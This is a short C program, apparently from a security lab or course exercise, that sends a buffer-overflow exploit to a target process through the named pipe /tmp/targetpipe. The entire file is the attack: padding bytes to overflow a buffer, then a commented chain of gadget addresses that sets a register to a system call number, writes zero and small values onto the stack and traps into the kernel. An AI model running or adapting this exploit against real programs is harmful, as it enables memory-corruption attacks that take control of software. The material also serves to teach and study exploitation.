#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util.h"

#define PIPEPATH "/tmp/targetpipe"

int main(void)
{
  writecmd(PIPEPATH, "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09\x09"
                      "\x09\x09\x09\x09" // no-ops until buffer overflow
                      "\xbe\xc6\xb6\xbb" // move 85 into eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x2d\xee\xac\xbb" // add 33 to eax
                      "\x9e\xb1\xb6\xbb" // add 12 to eax; eax now 394
                      "\xD4\xBE\xB3\xBB" // 0 out edx
                      "\x22\xA4\xBA\xBB\xf0\x28\xbf\xbf" // pop esp into ecx (future address of 0 word) 
                      "\x7E\xB8\xB6\xBB" // move edx (0 word) to stack
                      "\x8a\xb8\xb7\xbb" // inc edx
                      "\x22\xA4\xBA\xBB\xec\x28\xbf\xbf" // pop esp into ecx (future address of 1 word) 
                      "\x7E\xB8\xB6\xBB" // move edx (1 word) to stack
                      "\x8a\xb8\xb7\xbb" // inc edx
                      "\x22\xA4\xBA\xBB\xe8\x28\xbf\xbf" // pop esp into ecx (future address of 2 word) 
                      "\x7E\xB8\xB6\xBB" // move edx (2 word) to stack
                      "\xE5\xB6\xA9\xBB" // trap into kernel
                      "\x01\x01\x01\x01" // dummy value
                      "\xaa\xaa\xaa\xaa" // four-byte value 2
                      "\xaa\xaa\xaa\xaa" // four-byte value 1
                      "\xaa\xaa\xaa\xaa" // four-byte value 0
                      );
  
  return 0;
}
